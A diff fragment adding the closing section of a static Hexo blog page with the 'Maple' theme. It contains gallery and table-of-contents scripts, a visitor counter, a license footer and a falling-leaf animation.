+        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
+        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
+      });
+      $(this).find('.fancybox').each(function(){
+        $(this).attr('rel', 'article' + i);
+      });
+    });
+
+    Fancybox.bind('[data-fancybox="gallery"]', {
+        // options
+    })
+  })
+</script>
+
+<!-- tocbot begin -->
+
+<script src="/lib/tocbot/tocbot.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+      tocbot.init({
+        // Where to render the table of contents.
+        tocSelector: '.post-toc',
+        // Where to grab the headings to build the table of contents.
+        contentSelector: '.post-content',
+        // Which headings to grab inside of the contentSelector element.
+        headingSelector: 'h1, h2, h3',
+        // For headings inside relative or absolute positioned containers within content.
+        hasInnerContainers: true,
+    });
+  })
+</script>
+<!-- tocbot end -->
+
+
+  </main>
+  <footer class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm">
+  <!-- busuanzi -->
+  
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Busuanzi Analytics -->
+<div class="flex items-center gap-2">
+  <span>Visitors</span>
+  <span id="busuanzi_value_site_uv"></span>
+  <span>Page Views</span>
+  <span id="busuanzi_value_site_pv"></span>
+</div>
+<!-- End Busuanzi Analytics -->
+
+
+  <!-- copyright -->
+  <div class="flex items-center gap-2">
+    <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="color: inherit;">CC BY-NC-SA 4.0</a>
+    <span>© 2023</span>
+    <iconify-icon width="18" icon="emojione-monotone:maple-leaf" ></iconify-icon>
+    <a href="https://github.com/hehanzzz" target="_blank" rel="noopener noreferrer">Hehanzzz</a>
+  </div>
+  <!-- powered by -->
+  <div class="flex items-center gap-2">
+    <span>Powered by</span>
+    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
+    <span>&</span>
+    <a href="https://github.com/hehanzzz" target="_blank" rel="noopener noreferrer">Maple</a>
+  </div>
+
+</footer>
+
+  <div class="back-to-top box-border fixed right-6 z-1024 -bottom-20 rounded py-1 px-1 bg-slate-900 opacity-60 text-white cursor-pointer text-center dark:bg-slate-600">
+    <span class="flex justify-center items-center text-sm">
+      <iconify-icon width="18" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
+      <span id="scrollpercent"><span>0</span> %</span>
+    </span>
+  </div>
+  
+<script src="/js/main.js"></script>
+
+
+  <script>
+    $(document).ready(function () {
+      const mapleCount = "10";
+      const speed = "0.5";
+      const mapleEl = document.getElementById("maple");
+      const maples = Array.from({ length: mapleCount }).map(() => {
+        const maple = document.createElement("div");
+        const scale = Math.random() * 0.5 + 0.5;
+        const offset = Math.random() * 2 - 1;
+        const x = Math.random() * mapleEl.clientWidth;
+        const y = -Math.random() * mapleEl.clientHeight;
+        const duration = 10 / speed;
+        const delay = -duration;
+        maple.className = "maple";
+        maple.style.width = `${24 * scale}px`;
+        maple.style.height = `${24 * scale}px`;
+        maple.style.left = `${x}px`;
+        maple.style.top = `${y}px`;
+        maple.style.setProperty("--maple-fall-offset", offset);
+        maple.style.setProperty("--maple-fall-height", `${Math.abs(y) + mapleEl.clientHeight}px`);
+        maple.style.animation = `fall ${duration}s linear infinite`;
+        maple.style.animationDelay = `${delay}s`;
+        mapleEl.appendChild(maple)
+        return maple
+      })
+    });
+  </script>
+  
+
+
+  <div class="fixed top-0 bottom-0 left-0 right-0 pointer-events-none print:hidden" id="maple"></div>
+</body>
+
+</html>
